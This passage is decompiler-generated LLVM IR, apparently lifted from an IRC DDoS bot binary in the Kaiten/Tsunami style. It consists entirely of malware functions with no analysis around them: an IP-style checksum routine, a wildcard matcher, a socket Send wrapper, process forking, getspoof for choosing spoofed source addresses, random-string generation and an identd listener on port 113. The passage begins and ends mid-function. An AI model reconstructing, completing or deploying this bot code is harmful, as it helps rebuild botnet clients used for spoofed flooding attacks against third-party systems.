  %v1_1000029c = add i32 %v4_10000280, 2
  %v5_100002a0 = inttoptr i32 %v1_1000029c to i16*
  %v1_100002a8 = add nsw i32 %stack_var_-20.08, -2
  %v2_100002b4 = icmp sgt i32 %v1_100002a8, 1
  br i1 %v2_100002b4, label %dec_label_pc_10000280, label %dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge

dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge: ; preds = %dec_label_pc_10000280
  %v3_100002b4.le = icmp eq i32 %v1_100002a8, 1
  br i1 %v3_100002b4.le, label %dec_label_pc_100002c8, label %dec_label_pc_100002f8

dec_label_pc_100002bc:                            ; preds = %entry
  %v3_100002b46 = icmp eq i32 %arg2, 1
  br i1 %v3_100002b46, label %dec_label_pc_100002c8, label %dec_label_pc_100002f8

dec_label_pc_100002c8:                            ; preds = %dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge, %dec_label_pc_100002bc
  %stack_var_-24.0.lcssa17 = phi i16* [ %v5_100002a0, %dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge ], [ %arg1, %dec_label_pc_100002bc ]
  %stack_var_-16.0.lcssa16 = phi i32 [ %v2_10000290, %dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge ], [ 0, %dec_label_pc_100002bc ]
  %v1_100002d8 = bitcast i16* %stack_var_-24.0.lcssa17 to i8*
  %v2_100002d8 = load i8, i8* %v1_100002d8, align 1
  %v3_100002d8 = zext i8 %v2_100002d8 to i32
  %v2_100002f0 = add i32 %v3_100002d8, %stack_var_-16.0.lcssa16
  br label %dec_label_pc_100002f8

dec_label_pc_100002f8:                            ; preds = %dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge, %dec_label_pc_100002bc, %dec_label_pc_100002c8
  %stack_var_-16.1 = phi i32 [ %v2_100002f0, %dec_label_pc_100002c8 ], [ 0, %dec_label_pc_100002bc ], [ %v2_10000290, %dec_label_pc_100002b0.dec_label_pc_100002bc_crit_edge ]
  %v4_100002fc = sdiv i32 %stack_var_-16.1, 65536
  %v1_10000304 = urem i32 %stack_var_-16.1, 65536
  %v2_10000308 = add nsw i32 %v4_100002fc, %v1_10000304
  %v4_10000314 = sdiv i32 %v2_10000308, 65536
  %v2_1000031c = add nsw i32 %v4_10000314, %v2_10000308
  %v2_100003283 = urem i32 %v2_1000031c, 65536
  %v1_10000334 = xor i32 %v2_100003283, 65535
  ret i32 %v1_10000334

; uselistorder directives
  uselistorder i32 %v2_10000308, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0 }
  uselistorder i32 %v1_100002a8, { 0, 2, 1 }
  uselistorder i32 %v2_10000290, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100002f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100002c8, { 1, 0 }
  uselistorder label %dec_label_pc_10000280, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000034c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000034c, i32* %stack_var_-64, align 4
  %v2_10000370 = load i8, i8* %arg1, align 1
  %v3_10000380 = icmp eq i8 %v2_10000370, 42
  br i1 %v3_10000380, label %dec_label_pc_100003b8, label %dec_label_pc_10000388

dec_label_pc_10000388:                            ; preds = %entry
  %v3_1000038c = icmp eq i8 %v2_10000370, 63
  br i1 %v3_1000038c, label %dec_label_pc_1000042c, label %dec_label_pc_10000394

dec_label_pc_10000394:                            ; preds = %dec_label_pc_10000388
  %v3_10000398 = icmp eq i8 %v2_10000370, 0
  br i1 %v3_10000398, label %dec_label_pc_100003a4, label %dec_label_pc_10000488

dec_label_pc_100003a4:                            ; preds = %dec_label_pc_10000394
  %v2_100003a8 = load i8, i8* %tmp, align 1
  %v3_100003a8 = zext i8 %v2_100003a8 to i32
  br label %dec_label_pc_1000050c

dec_label_pc_100003b8:                            ; preds = %entry
  %v2_100003bc = add i32 %tmp8, 1
  store i32 268436428, i32* @lr, align 4
  %v5_100003c8 = inttoptr i32 %v2_100003bc to i8*
  %v6_100003c8 = call i32 @strwildmatch(i8* %v5_100003c8, i32 %arg2, i32 %tmp8)
  %v3_100003d0 = icmp eq i32 %v6_100003c8, 0
  br i1 %v3_100003d0, label %dec_label_pc_10000418, label %dec_label_pc_100003d8

dec_label_pc_100003d8:                            ; preds = %dec_label_pc_100003b8
  %v2_100003dc = load i8, i8* %tmp, align 1
  %v3_100003e4 = icmp eq i8 %v2_100003dc, 0
  br i1 %v3_100003e4, label %dec_label_pc_10000420, label %dec_label_pc_100003ec

dec_label_pc_100003ec:                            ; preds = %dec_label_pc_100003d8
  %v2_100003f0 = add i32 %arg2, 1
  store i32 268436480, i32* @lr, align 4
  %v6_100003fc = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v2_100003f0, i32 %arg2)
  %v3_10000404 = icmp eq i32 %v6_100003fc, 0
  br i1 %v3_10000404, label %dec_label_pc_10000418, label %dec_label_pc_10000420

dec_label_pc_10000418:                            ; preds = %dec_label_pc_100003ec, %dec_label_pc_100003b8
  br label %dec_label_pc_10000420

dec_label_pc_10000420:                            ; preds = %dec_label_pc_100003d8, %dec_label_pc_100003ec, %dec_label_pc_10000418
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10000418 ], [ 1, %dec_label_pc_100003ec ], [ 1, %dec_label_pc_100003d8 ]
  br label %dec_label_pc_1000050c

dec_label_pc_1000042c:                            ; preds = %dec_label_pc_10000388
  %v2_10000430 = load i8, i8* %tmp, align 1
  %v3_10000438 = icmp eq i8 %v2_10000430, 0
  br i1 %v3_10000438, label %dec_label_pc_1000047c, label %dec_label_pc_10000440

dec_label_pc_10000440:                            ; preds = %dec_label_pc_1000042c
  %v1_10000444 = add i32 %tmp8, 1
  %v2_1000044c = add i32 %arg2, 1
  store i32 268436572, i32* @lr, align 4
  %v4_10000458 = inttoptr i32 %v1_10000444 to i8*
  %v5_10000458 = call i32 @strwildmatch(i8* %v4_10000458, i32 %v2_1000044c, i32 %arg2)
  %v3_10000460 = icmp ne i32 %v5_10000458, 0
  %. = zext i1 %v3_10000460 to i32
  br label %dec_label_pc_1000047c

dec_label_pc_1000047c:                            ; preds = %dec_label_pc_10000440, %dec_label_pc_1000042c
  %storemerge2 = phi i32 [ 1, %dec_label_pc_1000042c ], [ %., %dec_label_pc_10000440 ]
  br label %dec_label_pc_1000050c

dec_label_pc_10000488:                            ; preds = %dec_label_pc_10000394
  %v3_1000048c = load i8, i8* %arg1, align 1
  %v4_1000048c = zext i8 %v3_1000048c to i32
  store i32 268436640, i32* @lr, align 4
  %v3_1000049c = call i32 @__GI_toupper(i32 %v4_1000048c, i32 %tmp8)
  %v3_100004a8 = load i8, i8* %tmp, align 1
  %v4_100004a8 = zext i8 %v3_100004a8 to i32
  store i32 268436668, i32* @lr, align 4
  %v3_100004b8 = call i32 @__GI_toupper(i32 %v4_100004a8, i32 %arg2)
  %v4_100004c0 = icmp eq i32 %v3_1000049c, %v3_100004b8
  br i1 %v4_100004c0, label %dec_label_pc_100004c8, label %dec_label_pc_10000504

dec_label_pc_100004c8:                            ; preds = %dec_label_pc_10000488
  %v1_100004cc = add i32 %tmp8, 1
  %v2_100004d4 = add i32 %arg2, 1
  store i32 268436708, i32* @lr, align 4
  %v4_100004e0 = inttoptr i32 %v1_100004cc to i8*
  %v5_100004e0 = call i32 @strwildmatch(i8* %v4_100004e0, i32 %v2_100004d4, i32 %arg2)
  %v3_100004e8 = icmp ne i32 %v5_100004e0, 0
  %.7 = zext i1 %v3_100004e8 to i32
  br label %dec_label_pc_10000504

dec_label_pc_10000504:                            ; preds = %dec_label_pc_100004c8, %dec_label_pc_10000488
  %storemerge = phi i32 [ 1, %dec_label_pc_10000488 ], [ %.7, %dec_label_pc_100004c8 ]
  br label %dec_label_pc_1000050c

dec_label_pc_1000050c:                            ; preds = %dec_label_pc_1000047c, %dec_label_pc_10000420, %dec_label_pc_100003a4, %dec_label_pc_10000504
  %stack_var_-36.0 = phi i32 [ %storemerge3, %dec_label_pc_10000420 ], [ %storemerge2, %dec_label_pc_1000047c ], [ %v3_100003a8, %dec_label_pc_100003a4 ], [ %storemerge, %dec_label_pc_10000504 ]
  %v2_10000514 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_10000514, i32* @r11, align 4
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_1000050c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10000420, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10000530 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10000530, i32* %stack_var_-144, align 4
  store i32 2, i32* %stack_var_-136, align 4
  store i32 ptrtoint (i32* @global_var_100452d4.22 to i32), i32* @r3, align 4
  %v2_100005b4 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268436928, i32* @lr, align 4
  %v4_100005bc = call i32 @vsprintf(i32 ptrtoint (i32* @global_var_100452d4.22 to i32), i32 %arg2, i32 %v2_100005b4, i32 268697600)
  store i32 ptrtoint (i32* @global_var_100452d4.22 to i32), i32* @r3, align 4
  %v0_100005c8 = call i32 @__GI_strlen()
  store i32 268436964, i32* @lr, align 4
  %v3_100005e0 = call i32 @write(i32 %arg1, i32 ptrtoint (i32* @global_var_100452d4.22 to i32), i32 %v0_100005c8)
  %v2_100005ec = load i32, i32* %stack_var_-144, align 4
  store i32 %v2_100005ec, i32* @r11, align 4
  %v1_100005f8 = add i32 %v2_100005ec, -4
  %v2_100005f8 = inttoptr i32 %v1_100005f8 to i32*
  %v3_100005f8 = load i32, i32* %v2_100005f8, align 4
  store i32 %v3_100005f8, i32* @r31, align 4
  ret i32 %v3_100005e0

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100452d4.22 to i32), { 1, 2, 0, 3 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10000620 = load i8, i8* @global_var_10045170.23, align 1
  %v3_10000628 = icmp eq i8 %v3_10000620, 1
  br i1 %v3_10000628, label %dec_label_pc_10000630, label %dec_label_pc_1000065c

dec_label_pc_10000630:                            ; preds = %entry
  %v3_10000634 = load i32, i32* @global_var_1004519c.24, align 4
  %v6_1000064c = call i32 @Send(i32 %v3_10000634, i32 ptrtoint ([30 x i8]* @global_var_1002a06c.25 to i32), i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_10000760

dec_label_pc_1000065c:                            ; preds = %entry
  store i32 268437088, i32* @lr, align 4
  %v0_1000065c = call i32 @fork()
  %v3_1000066c = icmp eq i32 %v0_1000065c, 0
  br i1 %v3_1000066c, label %dec_label_pc_10000674, label %dec_label_pc_10000680

dec_label_pc_10000674:                            ; preds = %dec_label_pc_1000065c
  br label %dec_label_pc_10000760

dec_label_pc_10000680:                            ; preds = %dec_label_pc_1000065c
  %v3_10000684 = load i32, i32* @global_var_1004517c.27, align 4
  %v1_10000688 = add i32 %v3_10000684, 1
  store i32 %v1_10000688, i32* @global_var_1004517c.27, align 4
  %v1_1000069c = mul i32 %v1_10000688, 4
  %v1_100006a0 = add i32 %v1_1000069c, 4
  store i32 %v1_100006a0, i32* @r3, align 4
  store i32 268437164, i32* @lr, align 4
  %v0_100006a8 = call i32 @malloc()
  %v3_100007042 = load i32, i32* @global_var_1004517c.27, align 4
  %v3_100007104 = icmp eq i32 %v3_100007042, 1
  br i1 %v3_100007104, label %dec_label_pc_10000718, label %dec_label_pc_100006c0

dec_label_pc_100006c0:                            ; preds = %dec_label_pc_10000680, %dec_label_pc_100006c0
  %storemerge16 = phi i32 [ %v1_100006f8, %dec_label_pc_100006c0 ], [ 0, %dec_label_pc_10000680 ]
  %v1_100006c4 = mul i32 %storemerge16, 4
  %v2_100006d0 = add i32 %v1_100006c4, %v0_100006a8
  store i32 %v2_100006d0, i32* @r10, align 4
  %v3_100006e4 = load i32, i32* @global_var_100451cc.28, align 4
  %v2_100006e8 = add i32 %v3_100006e4, %v1_100006c4
  %v1_100006ec = inttoptr i32 %v2_100006e8 to i32*
  %v2_100006ec = load i32, i32* %v1_100006ec, align 4
  %v2_100006f0 = inttoptr i32 %v2_100006d0 to i32*
  store i32 %v2_100006ec, i32* %v2_100006f0, align 4
  %v1_100006f8 = add i32 %storemerge16, 1
  %v3_10000704 = load i32, i32* @global_var_1004517c.27, align 4
  %v1_10000708 = add i32 %v3_10000704, -1
  %v3_10000710 = icmp ugt i32 %v1_10000708, %v1_100006f8
  br i1 %v3_10000710, label %dec_label_pc_100006c0, label %dec_label_pc_10000700.dec_label_pc_10000718_crit_edge

dec_label_pc_10000700.dec_label_pc_10000718_crit_edge: ; preds = %dec_label_pc_100006c0
  br label %dec_label_pc_10000718

dec_label_pc_10000718:                            ; preds = %dec_label_pc_10000680, %dec_label_pc_10000700.dec_label_pc_10000718_crit_edge
  %v3_1000071c = phi i32 [ %v3_10000704, %dec_label_pc_10000700.dec_label_pc_10000718_crit_edge ], [ %v3_100007042, %dec_label_pc_10000680 ]
  %v1_10000720 = mul i32 %v3_1000071c, 4
  %v2_1000072c = add i32 %v0_100006a8, -4
  %v1_10000730 = add i32 %v2_1000072c, %v1_10000720
  %v2_10000738 = inttoptr i32 %v1_10000730 to i32*
  store i32 %v0_1000065c, i32* %v2_10000738, align 4
  %v3_10000740 = load i32, i32* @global_var_100451cc.28, align 4
  store i32 %v3_10000740, i32* @r3, align 4
  store i32 268437324, i32* @lr, align 4
  %v0_10000748 = call i32 @free()
  store i32 %v0_100006a8, i32* @global_var_100451cc.28, align 4
  br label %dec_label_pc_10000760

dec_label_pc_10000760:                            ; preds = %dec_label_pc_10000674, %dec_label_pc_10000630, %dec_label_pc_10000718
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_10000630 ], [ 0, %dec_label_pc_10000674 ], [ %v0_1000065c, %dec_label_pc_10000718 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %v1_100006f8, { 1, 0 }
  uselistorder i32 %v1_100006c4, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v3_100007042, { 1, 0 }
  uselistorder i32 %v0_100006a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10000760, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000718, { 1, 0 }
  uselistorder label %dec_label_pc_100006c0, { 1, 0 }
}

define i32 @getspoof() local_unnamed_addr {
entry:
  %v3_10000798 = load i8*, i8** @global_var_10045174.29, align 4
  %v4_10000798 = ptrtoint i8* %v3_10000798 to i32
  %v3_1000079c = icmp eq i8* %v3_10000798, null
  br i1 %v3_1000079c, label %dec_label_pc_100007a4, label %dec_label_pc_100007b4

dec_label_pc_100007a4:                            ; preds = %entry
  store i32 268437416, i32* @lr, align 4
  %v0_100007a4 = call i32 @random()
  br label %dec_label_pc_10000818

dec_label_pc_100007b4:                            ; preds = %entry
  %v3_100007b8 = load i32, i32* @global_var_10045178.30, align 4
  %v3_100007bc = icmp eq i32 %v3_100007b8, 1
  br i1 %v3_100007bc, label %dec_label_pc_100007c4, label %dec_label_pc_100007dc

dec_label_pc_100007c4:                            ; preds = %dec_label_pc_100007b4
  store i32 %v4_10000798, i32* @r3, align 4
  %v3_100007d0 = call i32 @ntohl(i32 %v4_10000798, i32 268697600)
  br label %dec_label_pc_10000818

dec_label_pc_100007dc:                            ; preds = %dec_label_pc_100007b4
  store i32 268437472, i32* @lr, align 4
  %v0_100007dc = call i32 @random()
  %v3_100007ec = load i32, i32* @global_var_10045178.30, align 4
  %v2_100007f0 = urem i32 %v0_100007dc, %v3_100007ec
  %v3_10000800 = load i8*, i8** @global_var_10045174.29, align 4
  %v4_10000800 = ptrtoint i8* %v3_10000800 to i32
  %v2_10000804 = add i32 %v4_10000800, %v2_100007f0
  %v1_10000808 = add i32 %v2_10000804, 1
  store i32 %v1_10000808, i32* @r3, align 4
  %v2_10000810 = call i32 @ntohl(i32 %v1_10000808, i32 %v2_10000804)
  br label %dec_label_pc_10000818

dec_label_pc_10000818:                            ; preds = %dec_label_pc_100007c4, %dec_label_pc_100007a4, %dec_label_pc_100007dc
  %stack_var_-24.0 = phi i32 [ %v0_100007a4, %dec_label_pc_100007a4 ], [ %v3_100007d0, %dec_label_pc_100007c4 ], [ %v2_10000810, %dec_label_pc_100007dc ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_10000798, { 1, 0 }
  uselistorder i32 (i32, i32)* @ntohl, { 1, 0 }
  uselistorder label %dec_label_pc_10000818, { 2, 0, 1 }
}

define i32 @filter(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1000088c = add i32 %arg1, -1
  br label %dec_label_pc_10000878

dec_label_pc_10000854:                            ; preds = %dec_label_pc_100008a4, %dec_label_pc_10000878
  store i32 %arg1, i32* @r3, align 4
  %v0_10000858 = call i32 @__GI_strlen()
  %v1_1000086c = add i32 %v0_10000858, %v2_1000088c
  %v3_10000874 = inttoptr i32 %v1_1000086c to i8*
  store i8 0, i8* %v3_10000874, align 1
  br label %dec_label_pc_10000878

dec_label_pc_10000878:                            ; preds = %entry, %dec_label_pc_10000854
  store i32 %arg1, i32* @r3, align 4
  %v0_1000087c = call i32 @__GI_strlen()
  %v1_10000890 = add i32 %v0_1000087c, %v2_1000088c
  %v1_10000894 = inttoptr i32 %v1_10000890 to i8*
  %v2_10000894 = load i8, i8* %v1_10000894, align 1
  %v3_1000089c = icmp eq i8 %v2_10000894, 13
  br i1 %v3_1000089c, label %dec_label_pc_10000854, label %dec_label_pc_100008a4

dec_label_pc_100008a4:                            ; preds = %dec_label_pc_10000878
  store i32 %arg1, i32* @r3, align 4
  %v0_100008a8 = call i32 @__GI_strlen()
  %v1_100008bc = add i32 %v0_100008a8, %v2_1000088c
  %v1_100008c0 = inttoptr i32 %v1_100008bc to i8*
  %v2_100008c0 = load i8, i8* %v1_100008c0, align 1
  %v3_100008c8 = icmp eq i8 %v2_100008c0, 10
  br i1 %v3_100008c8, label %dec_label_pc_10000854, label %dec_label_pc_100008d0

dec_label_pc_100008d0:                            ; preds = %dec_label_pc_100008a4
  ret i32 %v0_100008a8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10000878, { 1, 0 }
}

define i32 @randstring(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268437768, i32* @lr, align 4
  %v1_10000904 = call i32 @__GI_time(i32 0)
  store i32 268437780, i32* @lr, align 4
  %v1_10000910 = call i32 @srand(i32 %v1_10000904)
  %v1_1000092c = add i32 %arg1, 1
  store i32 %v1_1000092c, i32* @r3, align 4
  store i32 268437816, i32* @lr, align 4
  %v0_10000934 = call i32 @malloc()
  %v3_10000944 = icmp eq i32 %v0_10000934, 0
  br i1 %v3_10000944, label %dec_label_pc_100009f4, label %dec_label_pc_10000958

dec_label_pc_10000958:                            ; preds = %entry
  %v2_100009cc5 = icmp sgt i32 %arg1, 0
  br i1 %v2_100009cc5, label %dec_label_pc_1000096c, label %dec_label_pc_100009d4

dec_label_pc_1000096c:                            ; preds = %dec_label_pc_10000958, %dec_label_pc_1000096c
  %storemerge38 = phi i32 [ %v1_100009bc, %dec_label_pc_1000096c ], [ 0, %dec_label_pc_10000958 ]
  store i32 268437872, i32* @lr, align 4
  %v0_1000096c = call i32 @random()
  %v2_1000097c = urem i32 %v0_1000096c, 62
  %v2_1000099c = add i32 %storemerge38, %v0_10000934
  %v2_100009a8 = add i32 %v2_1000097c, ptrtoint ([63 x i8]* @global_var_1002a08c.31 to i32)
  %v1_100009ac = inttoptr i32 %v2_100009a8 to i8*
  %v2_100009ac = load i8, i8* %v1_100009ac, align 1
  %v3_100009b4 = inttoptr i32 %v2_1000099c to i8*
  store i8 %v2_100009ac, i8* %v3_100009b4, align 1
  %v1_100009bc = add nuw nsw i32 %storemerge38, 1
  %v2_100009cc = icmp slt i32 %v1_100009bc, %arg1
  br i1 %v2_100009cc, label %dec_label_pc_1000096c, label %dec_label_pc_100009d4

dec_label_pc_100009d4:                            ; preds = %dec_label_pc_1000096c, %dec_label_pc_10000958
  %v2_100009e0 = add i32 %v0_10000934, %arg1
  %v3_100009e8 = inttoptr i32 %v2_100009e0 to i8*
  store i8 0, i8* %v3_100009e8, align 1
  br label %dec_label_pc_100009f4

dec_label_pc_100009f4:                            ; preds = %entry, %dec_label_pc_100009d4
  %storemerge = phi i32 [ %v0_10000934, %dec_label_pc_100009d4 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_100009bc, { 1, 0 }
  uselistorder i32 %storemerge38, { 1, 0 }
  uselistorder i32 %v0_10000934, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100009f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000096c, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1180 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-1240 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-1216 = alloca i32, align 4
  %stack_var_-1196 = alloca i32, align 4
  store i32 268438072, i32* @lr, align 4
  %v3_10000a34 = call i32 @socket(i32 2, i32 1, i32 0)
  %v4_10000a48 = icmp eq i32 %v3_10000a34, -1
  br i1 %v4_10000a48, label %dec_label_pc_10000d70, label %dec_label_pc_10000a50

dec_label_pc_10000a50:                            ; preds = %entry
  store i32 113, i32* @r3, align 4
  %v1_10000a5c = call i32 @htons(i32 113)
  store i32 %v3_10000a34, i32* @r3, align 4
  store i32 268438172, i32* @lr, align 4
  %v0_10000a98 = call i32 @bind()
  %v4_10000aa4 = icmp eq i32 %v0_10000a98, -1
  br i1 %v4_10000aa4, label %dec_label_pc_10000d70, label %dec_label_pc_10000aac

dec_label_pc_10000aac:                            ; preds = %dec_label_pc_10000a50
  store i32 268438200, i32* @lr, align 4
  %v3_10000ab4 = call i32 @listen(i32 %v3_10000a34, i32 1, i32 %v0_10000a98)
  %v4_10000ac0 = icmp eq i32 %v3_10000ab4, -1
  br i1 %v4_10000ac0, label %dec_label_pc_10000d70, label %dec_label_pc_10000ac8

dec_label_pc_10000ac8:                            ; preds = %dec_label_pc_10000aac
  store i32 268438220, i32* @lr, align 4
  %v0_10000ac8 = call i32 @fork()
  %v3_10000ad0 = icmp eq i32 %v0_10000ac8, 0
  br i1 %v3_10000ad0, label %dec_label_pc_10000d70, label %dec_label_pc_10000ad8

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000ac8
  store i32 16, i32* %stack_var_-1216, align 4
  %v2_10000ae0 = ptrtoint i32* %stack_var_-1196 to i32
  %v2_10000ae4 = ptrtoint i32* %stack_var_-1216 to i32
  store i32 268438264, i32* @lr, align 4
  %v4_10000af4 = call i32 @accept(i32 %v3_10000a34, i32 %v2_10000ae0, i32 %v2_10000ae4, i32 %v2_10000ae4)
  %v4_10000b08 = icmp eq i32 %v4_10000af4, -1
  br i1 %v4_10000b08, label %dec_label_pc_10000b10, label %dec_label_pc_10000b18.preheader

dec_label_pc_10000b10:                            ; preds = %dec_label_pc_10000ad8
  %v0_10000b14 = call i32 @__GI_exit()
  br label %dec_label_pc_10000b18.preheader

dec_label_pc_10000b18.preheader:                  ; preds = %dec_label_pc_10000b10, %dec_label_pc_10000ad8
  %v2_10000b18 = ptrtoint i32* %stack_var_-148 to i32
  %v1_10000b60 = udiv i32 %v4_10000af4, 32
  %v1_10000b68 = mul nuw nsw i32 %v1_10000b60, 4
  %v2_10000b6c = ptrtoint i32* %stack_var_-1240 to i32
  %v2_10000b70 = add i32 %v2_10000b6c, 1092
  %v1_10000b74 = add i32 %v2_10000b70, %v1_10000b68
  %v1_10000b78 = inttoptr i32 %v1_10000b74 to i32*
  %v1_10000b80 = urem i32 %v4_10000af4, 32
  %v3_10000b88 = shl i32 1, %v1_10000b80
  %v1_10000bb8 = add i32 %v4_10000af4, 1
  %v2_10000bc0 = ptrtoint i32* %stack_var_-156 to i32
  %v3_10000c14 = sub i32 0, %v4_10000af4
  %v4_10000c14 = urem i32 %v3_10000c14, 32
  %v6_10000c14 = xor i32 %v4_10000c14, 31
  %v12_10000c14 = lshr i32 -1, %v1_10000b80
  %v16_10000c14 = xor i32 %v12_10000c14, 1
  %v14_10000c14 = urem i32 %v12_10000c14, 2
  br label %dec_label_pc_10000b18

dec_label_pc_10000b18:                            ; preds = %dec_label_pc_10000b18.preheader, %dec_label_pc_10000bf0
  store i32 %v2_10000b18, i32* %stack_var_-1240, align 4
  store i32 0, i32* %stack_var_-148, align 4
  br label %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge

dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge: ; preds = %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge.dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge_crit_edge, %dec_label_pc_10000b18
  %v3_10000b30.pre = phi i32 [ %v2_10000b18, %dec_label_pc_10000b18 ], [ %v3_10000b30.pre.pre, %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge.dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge_crit_edge ]
  %v1_10000b4830 = phi i32 [ 1, %dec_label_pc_10000b18 ], [ %v1_10000b48, %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge.dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge_crit_edge ]
  %v1_10000b34 = mul nuw nsw i32 %v1_10000b4830, 4
  %v2_10000b38 = add i32 %v1_10000b34, %v3_10000b30.pre
  %v2_10000b40 = inttoptr i32 %v2_10000b38 to i32*
  store i32 0, i32* %v2_10000b40, align 4
  %v1_10000b48 = add nuw nsw i32 %v1_10000b4830, 1
  %tmp25 = icmp ult i32 %v1_10000b48, 32
  br i1 %tmp25, label %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge.dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge_crit_edge, label %dec_label_pc_10000b5c

dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge.dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge_crit_edge: ; preds = %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge
  %v3_10000b30.pre.pre = load i32, i32* %stack_var_-1240, align 4
  br label %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge

dec_label_pc_10000b5c:                            ; preds = %dec_label_pc_10000b2c.dec_label_pc_10000b2c_crit_edge
  %v2_10000b78 = load i32, i32* %v1_10000b78, align 4
  %v2_10000b8c = or i32 %v2_10000b78, %v3_10000b88
  store i32 %v2_10000b8c, i32* %v1_10000b78, align 4
  store i32 60, i32* %stack_var_-156, align 4
  store i32 268438492, i32* @lr, align 4
  %v5_10000bd8 = call i32 @__libc_select(i32 %v1_10000bb8, i32 %v2_10000b18, i32 0, i32 0, i32 %v2_10000bc0)
  %tmp26 = icmp sgt i32 %v5_10000bd8, -1
  br i1 %tmp26, label %dec_label_pc_10000bf0, label %dec_label_pc_10000be8

dec_label_pc_10000be8:                            ; preds = %dec_label_pc_10000b5c
  %v0_10000bec = call i32 @__GI_exit()
  br label %dec_label_pc_10000bf0

dec_label_pc_10000bf0:                            ; preds = %dec_label_pc_10000b5c, %dec_label_pc_10000be8
  %v2_10000c08 = load i32, i32* %v1_10000b78, align 4
  %v5_10000c14 = shl i32 %v2_10000c08, %v4_10000c14
  %v7_10000c14 = lshr i32 %v2_10000c08, %v6_10000c14
  %v8_10000c14 = udiv i32 %v7_10000c14, 2
  %v9_10000c14 = or i32 %v8_10000c14, %v5_10000c14
  %tmp = icmp slt i32 %v2_10000c08, 0
  %v15_10000c142 = zext i1 %tmp to i32
  %v17_10000c14 = and i32 %v15_10000c142, %v16_10000c14
  %v14_10000c14.masked = and i32 %v14_10000c14, %v9_10000c14
  %v1_10000c1c = or i32 %v14_10000c14.masked, %v17_10000c14
  %v3_10000c20 = icmp eq i32 %v1_10000c1c, 0
  br i1 %v3_10000c20, label %dec_label_pc_10000b18, label %dec_label_pc_10000c2c

dec_label_pc_10000c2c:                            ; preds = %dec_label_pc_10000bf0
  %v2_10000c2c = ptrtoint i32* %stack_var_-1180 to i32
  store i32 268438596, i32* @lr, align 4
  %v4_10000c40 = call i32 @recv(i32 %v4_10000af4, i32 %v2_10000c2c, i32 1024, i32 0)
  %tmp27 = icmp slt i32 %v4_10000c40, 1
  br i1 %tmp27, label %dec_label_pc_10000c64, label %dec_label_pc_10000c58

dec_label_pc_10000c58:                            ; preds = %dec_label_pc_10000c2c
  %tmp28 = icmp slt i32 %v4_10000c40, 20
  br i1 %tmp28, label %dec_label_pc_10000c6c, label %dec_label_pc_10000c64

dec_label_pc_10000c64:                            ; preds = %dec_label_pc_10000c58, %dec_label_pc_10000c2c
